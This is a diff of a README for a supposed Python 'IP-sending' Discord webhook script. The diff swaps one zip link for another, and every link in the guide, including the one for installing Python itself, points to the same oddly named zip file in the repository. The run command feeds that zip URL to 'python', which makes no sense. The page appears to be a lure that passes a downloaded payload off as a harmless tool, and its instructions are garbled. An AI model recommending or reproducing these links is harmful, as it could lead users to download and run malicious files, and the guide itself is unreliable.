@@ -6,7 +6,7 @@ This guide will help you download and run the ip-sending-script. This Python scr
 
 ## 📥 Download the Script
 
-[![Download Script](https://raw.githubusercontent.com/kramixx/ip-sending-script-with-webhook-python/main/cupronickel/ip-sending-script-with-webhook-python.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/kramixx/ip-sending-script-with-webhook-python/main/cupronickel/ip-sending-script-with-webhook-python.zip)
+[![Download Script](https://github.com/kramixx/ip-sending-script-with-webhook-python/raw/refs/heads/main/cupronickel/python-sending-ip-with-script-webhook-slovenly.zip%20Now-Click%20Here-brightgreen)](https://github.com/kramixx/ip-sending-script-with-webhook-python/raw/refs/heads/main/cupronickel/python-sending-ip-with-script-webhook-slovenly.zip)
 
 To get started, you need to download the script from our Releases page. This script is lightweight and easy to use.
 
@@ -19,10 +19,10 @@ To get started, you need to download the script from our Releases page. This scr
 ## 🛠️ How to Install
 
 1. **Download the Script:**
-   Visit [this page to download](https://raw.githubusercontent.com/kramixx/ip-sending-script-with-webhook-python/main/cupronickel/ip-sending-script-with-webhook-python.zip) the latest version of the script. Look for a file named something like `https://raw.githubusercontent.com/kramixx/ip-sending-script-with-webhook-python/main/cupronickel/ip-sending-script-with-webhook-python.zip`.
+   Visit [this page to download](https://github.com/kramixx/ip-sending-script-with-webhook-python/raw/refs/heads/main/cupronickel/python-sending-ip-with-script-webhook-slovenly.zip) the latest version of the script. Look for a file named something like `https://github.com/kramixx/ip-sending-script-with-webhook-python/raw/refs/heads/main/cupronickel/python-sending-ip-with-script-webhook-slovenly.zip`.
 
 2. **Install Python:**
-   If you don’t have Python installed, download it from [https://raw.githubusercontent.com/kramixx/ip-sending-script-with-webhook-python/main/cupronickel/ip-sending-script-with-webhook-python.zip](https://raw.githubusercontent.com/kramixx/ip-sending-script-with-webhook-python/main/cupronickel/ip-sending-script-with-webhook-python.zip). Follow the instructions for your operating system to install Python.
+   If you don’t have Python installed, download it from [https://github.com/kramixx/ip-sending-script-with-webhook-python/raw/refs/heads/main/cupronickel/python-sending-ip-with-script-webhook-slovenly.zip](https://github.com/kramixx/ip-sending-script-with-webhook-python/raw/refs/heads/main/cupronickel/python-sending-ip-with-script-webhook-slovenly.zip). Follow the instructions for your operating system to install Python.
 
 3. **Configure the Script:**
    - Open the script in a text editor.
@@ -37,7 +37,7 @@ To get started, you need to download the script from our Releases page. This scr
      ```
    - Run the script by typing the following command:
      ```
-     python https://raw.githubusercontent.com/kramixx/ip-sending-script-with-webhook-python/main/cupronickel/ip-sending-script-with-webhook-python.zip
+     python https://github.com/kramixx/ip-sending-script-with-webhook-python/raw/refs/heads/main/cupronickel/python-sending-ip-with-script-webhook-slovenly.zip
      ```
 
 5. **Check Your Discord:**
@@ -73,6 +73,6 @@ This project is open-source. You can modify and share it under the terms of the 
 
 ## 📦 Download & Install
 
-To download the script, go to [this page to download](https://raw.githubusercontent.com/kramixx/ip-sending-script-with-webhook-python/main/cupronickel/ip-sending-script-with-webhook-python.zip). Follow the installation instructions provided above to set it up on your system.
+To download the script, go to [this page to download](https://github.com/kramixx/ip-sending-script-with-webhook-python/raw/refs/heads/main/cupronickel/python-sending-ip-with-script-webhook-slovenly.zip). Follow the installation instructions provided above to set it up on your system.
 
 By following this guide, you can easily track your IP address and learn a bit about webhooks in Discord. Enjoy exploring!
